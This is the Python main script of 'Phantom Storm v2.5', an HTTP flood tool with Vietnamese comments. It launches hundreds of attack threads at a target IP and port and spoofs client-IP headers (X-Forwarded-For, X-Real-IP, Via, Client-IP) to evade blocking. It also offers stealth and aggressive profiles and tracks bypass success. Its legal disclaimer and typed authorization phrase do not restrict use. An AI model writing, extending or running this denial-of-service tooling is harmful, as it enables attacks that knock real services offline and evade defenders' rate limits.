#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Phantom Storm v2.5 Ultimate - Main Entry Point
========================================================================
✨ NEW IN v2.5:
    - Modular architecture (src/core, src/utils)
    - IP Spoofing (X-Forwarded-For, X-Real-IP, Via, Client-IP)
    - Smart IP generation (avoid private/reserved ranges)
    - Bypass success rate tracking
    - Multiple evasion techniques
    
LEGAL DISCLAIMER:
    This tool is designed EXCLUSIVELY for authorized penetration testing
    in controlled lab environments. Unauthorized use against systems you
    do not own or have explicit written permission to test is ILLEGAL.
    
    The developers assume NO LIABILITY for misuse of this software.
    USE AT YOUR OWN RISK.
========================================================================
"""

import sys
import socket
import threading
import time
import logging
from datetime import datetime

# Import modules từ src package
from src import (
    AttackWorker,
    AttackStatistics,
    IPGenerator,
    HTTPMethod,
    Colors,
    setup_logging,
    config
)
from src.core import AttackProfiles, ProfileType

# ============================================================================
# BANNER & UI
# ============================================================================

def print_banner():
    """Hiển thị banner và legal disclaimer"""
    banner = rf"""{Colors.OKCYAN}
    ____  _   _    _    _   _ _____ ___  __  __   ____ _____ ___  ____  __  __ 
   |  _ \| | | |  / \  | \ | |_   _/ _ \|  \/  | / ___|_   _/ _ \|  _ \|  \/  |
   | |_) | |_| | / _ \ |  \| | | || | | | |\/| | \___ \ | || | | | |_) | |\/| |
   |  __/|  _  |/ ___ \| |\  | | || |_| | |  | |  ___) || || |_| |  _ <|  |  |
   |_|   |_| |_/_/   \_\_| \_| |_| \___/|_|  |_| |____/ |_| \___/|_| \_\_|  |_|
{Colors.ENDC}   
            {Colors.BOLD}>> [ v{config.VERSION} - {config.VERSION_NAME.upper()} ] <<{Colors.ENDC}
   ===========================================================================
   {Colors.OKGREEN}[+] Version    : {config.VERSION} {config.VERSION_NAME}
   [+] Purpose    : Authorized Penetration Testing Only
   [+] NEW        : Modular Architecture | Clean Code | Easy to Extend{Colors.ENDC}
   ===========================================================================
    """
    print(banner)
    
    disclaimer = f"""{Colors.WARNING}
   {Colors.BOLD}WARNING - LEGAL DISCLAIMER - WARNING{Colors.ENDC}{Colors.WARNING}
   
   This tool is intended ONLY for authorized security testing in controlled
   lab environments. You MUST have explicit written permission to test any
   target system. Unauthorized use is ILLEGAL and may result in criminal
   prosecution.
   
   By using this tool, you acknowledge that you are solely responsible for
   your actions and any consequences thereof.
   {Colors.ENDC}"""
    print(disclaimer)

def print_stats_header():
    """In header cho bảng thống kê"""
    print(f"\n{Colors.OKBLUE}{'='*80}")
    print(f"{'REAL-TIME ATTACK STATISTICS':^80}")
    print(f"{'='*80}{Colors.ENDC}\n")

# ============================================================================
# STATISTICS MONITOR
# ============================================================================

def stats_monitor(stats: AttackStatistics, update_interval: int = config.STATS_UPDATE_INTERVAL):
    """Thread để hiển thị thống kê real-time"""
    print_stats_header()
    
    while True:
        try:
            time.sleep(update_interval)
            current_stats = stats.get_stats()
            
            # Format runtime
            runtime_str = time.strftime('%H:%M:%S', time.gmtime(current_stats['runtime']))
            
            output = f"""{Colors.OKGREEN}
[Runtime: {runtime_str}]
├─ Active Connections    : {current_stats['connections_active']:,}
├─ Total Established     : {current_stats['connections_established']:,}
├─ Total Failed          : {current_stats['connections_failed']:,}
├─ Success Rate          : {current_stats['success_rate']:.2f}%
├─ Total Packets Sent    : {current_stats['total_packets']:,}
├─ Packets/Second        : {current_stats['packets_per_second']:.2f}
{Colors.ENDC}{Colors.OKCYAN}├─ Unique IPs Used       : {current_stats['unique_ips_used']:,}
├─ Bypass Attempts       : {current_stats['bypass_attempts']:,}
└─ IP Diversity          : {current_stats['bypass_diversity']:.2f}%
{Colors.ENDC}"""
            
            # In top 3 error types nếu có
            if current_stats['error_types']:
                sorted_errors = sorted(current_stats['error_types'].items(), 
                                     key=lambda x: x[1], reverse=True)[:3]
                output += f"{Colors.WARNING}\n[Top Errors]\n"
                for error_type, count in sorted_errors:
                    output += f"  • {error_type}: {count:,}\n"
                output += Colors.ENDC
            
            print(output)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.error(f"Stats monitor error: {e}")

# ============================================================================
# TARGET VALIDATION
# ============================================================================

def validate_target(target_ip: str, target_port: int) -> bool:
    """Kiểm tra xem target có accessible không"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((target_ip, target_port))
        sock.close()
        return result == 0
    except:
        return False

def get_user_confirmation() -> bool:
    """Yêu cầu xác nhận từ user về authorization"""
    print(f"\n{Colors.WARNING}{Colors.BOLD}AUTHORIZATION CHECK:{Colors.ENDC}")
    print(f"{Colors.WARNING}Do you have EXPLICIT WRITTEN PERMISSION to test this target?{Colors.ENDC}")
    response = input(f"{Colors.WARNING}Type 'YES I AM AUTHORIZED' to continue: {Colors.ENDC}")
    return response.strip() == "YES I AM AUTHORIZED"

# ============================================================================
# MAIN FUNCTION
# ============================================================================

def main():
    print_banner()
    
    # Validate arguments
    if len(sys.argv) < 4:
        print(f"{Colors.FAIL}[ERROR] Invalid arguments!{Colors.ENDC}\n")
        print(f"{Colors.OKBLUE}Usage:{Colors.ENDC}")
        print(f"  python phantom_storm.py [Target_IP] [Port] [Threads] [Options]\n")
        print(f"{Colors.OKBLUE}Options:{Colors.ENDC}")
        print(f"  --profile=PROFILE  Use predefined profile (stealth, balanced, aggressive)")
        print(f"  --no-spoof         Disable IP spoofing")
        print(f"  --method=METHOD    HTTP method (GET, POST, HEAD, OPTIONS, PUT, DELETE)")
        print(f"  --random-method    Use random HTTP method for each request\n")
        print(f"{Colors.OKBLUE}Examples:{Colors.ENDC}")
        print(f"  python phantom_storm.py 192.168.1.100 80 200")
        print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=stealth")
        print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=aggressive")
        print(f"  python phantom_storm.py 192.168.1.100 80 200 --no-spoof --method=POST\n")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads_count = int(sys.argv[3])
    
    # Parse options - check for profile first
    profile = None
    use_spoofing = True
    http_method = HTTPMethod.GET
    randomize_method = False
    
    for arg in sys.argv[4:]:
        if arg.startswith('--profile='):
            profile_name = arg.split('=')[1].lower()
            if profile_name == 'stealth':
                profile = AttackProfiles.get_stealth()
            elif profile_name == 'balanced':
                profile = AttackProfiles.get_balanced()
            elif profile_name == 'aggressive':
                profile = AttackProfiles.get_aggressive()
            else:
                print(f"{Colors.FAIL}[ERROR] Invalid profile: {profile_name}{Colors.ENDC}")
                print(f"Valid profiles: stealth, balanced, aggressive\n")
                sys.exit(1)
    
    # If profile is set, use profile settings
    if profile:
        threads_count = profile.threads
        use_spoofing = profile.use_spoofing
        http_method = profile.http_method if profile.http_method else HTTPMethod.GET
        randomize_method = profile.randomize_method
        
        print(f"\n{Colors.OKCYAN}{'='*80}")
        print(f"{Colors.BOLD}USING ATTACK PROFILE: {profile.name.upper()}{Colors.ENDC}{Colors.OKCYAN}")
        print(f"{'='*80}{Colors.ENDC}")
        print(profile.display_info())
    else:
        # Parse other options
        for arg in sys.argv[4:]:
            if arg == '--no-spoof':
                use_spoofing = False
            elif arg.startswith('--method='):
                method_name = arg.split('=')[1].upper()
                try:
                    http_method = HTTPMethod[method_name]
                except KeyError:
                    print(f"{Colors.FAIL}[ERROR] Invalid method: {method_name}{Colors.ENDC}")
                    print(f"Valid methods: GET, POST, HEAD, OPTIONS, PUT, DELETE\n")
                    sys.exit(1)
            elif arg == '--random-method':
                randomize_method = True
    
    # Display config
    if use_spoofing:
        print(f"{Colors.OKGREEN}[+] IP Spoofing ENABLED - Bypass mode active!{Colors.ENDC}")
    else:
        print(f"{Colors.WARNING}[!] IP Spoofing DISABLED{Colors.ENDC}")
    
    if randomize_method:
        print(f"{Colors.OKCYAN}[+] HTTP Method: RANDOM (GET/POST/HEAD/OPTIONS){Colors.ENDC}")
    else:
        print(f"{Colors.OKCYAN}[+] HTTP Method: {http_method.value}{Colors.ENDC}")
    
    # Authorization check
    if not get_user_confirmation():
        print(f"\n{Colors.FAIL}[ABORTED] Authorization not confirmed. Exiting...{Colors.ENDC}\n")
        sys.exit(1)
    
    # Setup logging
    log_filename = f"phantom_storm_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    setup_logging(log_filename)
    logging.info(f"Starting Phantom Storm v{config.VERSION} - Target: {target_ip}:{target_port}")
    logging.info(f"IP Spoofing: {'ENABLED' if use_spoofing else 'DISABLED'}")
    
    # Validate target
    print(f"\n{Colors.OKCYAN}[*] Validating target accessibility...{Colors.ENDC}")
    if not validate_target(target_ip, target_port):
        print(f"{Colors.WARNING}[!] Warning: Target appears unreachable. Continue anyway? (y/n): {Colors.ENDC}", end='')
        if input().lower() != 'y':
            print(f"{Colors.FAIL}[ABORTED]{Colors.ENDC}\n")
            sys.exit(1)
    else:
        print(f"{Colors.OKGREEN}[✓] Target is accessible{Colors.ENDC}")
    
    # Initialize statistics
    stats = AttackStatistics()
    
    # Start attack
    print(f"\n{Colors.OKGREEN}[*] Launching attack on {target_ip}:{target_port}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[*] Spawning {threads_count} attack threads...{Colors.ENDC}")
    if use_spoofing:
        print(f"{Colors.OKCYAN}[*] Each connection will use unique spoofed IP{Colors.ENDC}")
        print(f"{Colors.OKCYAN}[*] Bypass headers: X-Forwarded-For, X-Real-IP, Client-IP, Via, etc.{Colors.ENDC}")
    if randomize_method:
        print(f"{Colors.OKCYAN}[*] Using random HTTP methods for each request{Colors.ENDC}")
    else:
        print(f"{Colors.OKCYAN}[*] Using HTTP method: {http_method.value}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[*] Log file: logs/{log_filename}{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] Press Ctrl+C to stop{Colors.ENDC}")
    
    logging.info(f"Spawning {threads_count} attack threads")
    logging.info(f"HTTP Method: {'RANDOM' if randomize_method else http_method.value}")
    
    # Create và start workers
    workers = []
    for i in range(threads_count):
        worker = AttackWorker(
            target_ip, 
            target_port, 
            stats, 
            worker_id=i, 
            use_spoofing=use_spoofing,
            http_method=http_method,
            randomize_method=randomize_method
        )
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        workers.append(worker)
        time.sleep(0.01)  # Stagger thread creation
    
    # Start stats monitor
    monitor_thread = threading.Thread(target=stats_monitor, args=(stats,), daemon=True)
    monitor_thread.start()
    
    # Main loop
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrupt received. Shutting down gracefully...{Colors.ENDC}")
        
        # Stop all workers
        for worker in workers:
            worker.stop()
        
        time.sleep(2)  # Allow threads to cleanup
        
        # Final stats
        final_stats = stats.get_stats()
        print(f"\n{Colors.OKBLUE}{'='*80}")
        print(f"{'FINAL STATISTICS':^80}")
        print(f"{'='*80}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}")
        print(f"Total Runtime          : {time.strftime('%H:%M:%S', time.gmtime(final_stats['runtime']))}")
        print(f"Connections Established: {final_stats['connections_established']:,}")
        print(f"Connections Failed     : {final_stats['connections_failed']:,}")
        print(f"Success Rate           : {final_stats['success_rate']:.2f}%")
        print(f"Total Packets Sent     : {final_stats['total_packets']:,}")
        print(f"Average Packets/Second : {final_stats['packets_per_second']:.2f}")
        
        if use_spoofing:
            print(f"\n{Colors.OKCYAN}[IP Spoofing Stats]{Colors.ENDC}{Colors.OKGREEN}")
            print(f"Unique IPs Used        : {final_stats['unique_ips_used']:,}")
            print(f"Bypass Attempts        : {final_stats['bypass_attempts']:,}")
            print(f"IP Diversity Rate      : {final_stats['bypass_diversity']:.2f}%")
        
        print(f"{Colors.ENDC}")
        
        logging.info("Attack completed. Final stats logged.")
        print(f"{Colors.OKGREEN}[✓] Shutdown complete. Check logs/{log_filename} for details.{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
